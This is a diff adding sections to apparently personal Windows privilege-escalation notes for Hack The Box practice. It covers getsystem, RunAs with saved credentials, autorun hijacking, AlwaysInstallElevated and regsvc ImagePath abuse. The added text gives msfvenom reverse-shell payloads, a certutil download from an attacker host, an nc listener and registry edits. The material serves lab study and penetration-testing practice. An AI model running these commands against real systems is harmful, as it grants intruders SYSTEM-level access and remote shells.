@@ -126,10 +126,81 @@
 - HTB to practice: Jeeves
 
 ## Escalation Path: getsystem
+- Sometimes, Meterpreter elevates you from a local administrator to the SYSTEM user using `getsystem` command
+- In Meterpreter
+	- `getsystem`
+- More on:  https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/
 
 ## Escalation Path: RunAs
+- Allows a user to run specific tools and programs with different permissions than the user's current logon provides.
+- View the current listed/stored credentials
+	- `cmdkey /list`
+- `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\security\root.txt`
+- HTB to practice: Access
 
 ## Escalation Path: Registry
+**Autoruns**
+- Check for if any [autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) is available on the system.
+- `Autoruns.exe`
+- Analyse the programs and we can check their access with [accesschk64](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
+- `accesschk64.exe -wvu "C:\Program Files\Autorun Program"`
+- If everyone has read, write access on file that automatically runs, we can make somebody else run it as administrator.
+- Using Powerup.
+	- `. .\PowerUp.ps1`
+	- `Invoke-AllChecks`
+	- Check the output: Checking for modifidable registry autoruns and configs
+- Create a reverse payload
+	- `msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker-IP> -f exe -o program.exe`
+- Using metasploit
+	- `use multi/handler`
+  - `set payload windows/meterpreter/reverse_tcp`
+  - `set lhost <attacker-ip>`
+  - `run`
+- Delivery
+	- Move the program.exe on the windows machine
+	- `python3 -m http.server 1337`
+  - In windows machine, download the file under `C:\Program Files\Autorun Program`
+- Once a high privilege user run the programs, a reverse shell is gained in metasploit
+
+**AlwaysInstallElevated**
+- The windows installer is a utility which through the use MSI packages can install new software. The AlawysInstallElevated is a Windows policy that allows unprivileged users to install software through the use of MSI packages using SYSTEM level permissions, which can be exploited to gain administrative access over a Windows machine.
+- Check whether the required registry keys are enabled.
+	- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+	- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+	- The value in following registry keys has to be set to 1.
+- Check using winpeas.
+	- `winpeas.exe quiet systeminfo`
+- Exploitation
+	- Payload Generation
+		- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f msi > shell.msi`
+	- Delivery
+		- `python3 -m http.server 1337`
+	- Download
+		- `certutil -urlcache -split -f "http://<attacker-ip>:1337/shell.msi" shell.msi`
+	- Netcat Listener
+		- `nc -lvnp 4444`
+	- The following command can then be used to install the .msi file
+		- `msiexec /quiet /qn /i shell.msi`
+- Using Metasploit
+	- In Meterpreter
+		- `background`
+		- `search alwaysinstallelevated`
+		- `use /eploit/windows/local/always_install_elevated`
+		- `set session 1`
+		- `exploit`
+- More on: https://steflan-security.com/windows-privilege-escalation-alwaysinstallelevated-policy/
+
+**Service Escalation - regsvc**
+- Detection
+	- Open powershell prompt and type: `Get-Acl hklm:\System\CurrentControlSet\services\regsvc | fl`
+	- Notice that the output suggests that user belong to "NT AUTHORITY\INTERACTIVE" has "FullControl" permission over the registry key.
+	- If Authenticated Users or NT AUTHORITY/INTERACTIVE have FullControl in any of the services, in that case, you can change the binary that is going to be executed by the service.
+- Exploitation
+	- Modify the `ImagePath` key of the registry to your payload path and restart the service.
+	- ` reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /f`
+	- `sc start regsvc`
+- More on: https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842
+- Detailed on: https://systemweakness.com/windows-privilege-escalation-weak-registry-permissions-9060c1ca7c10
 
 ## Escalation Path: Executable Files
 
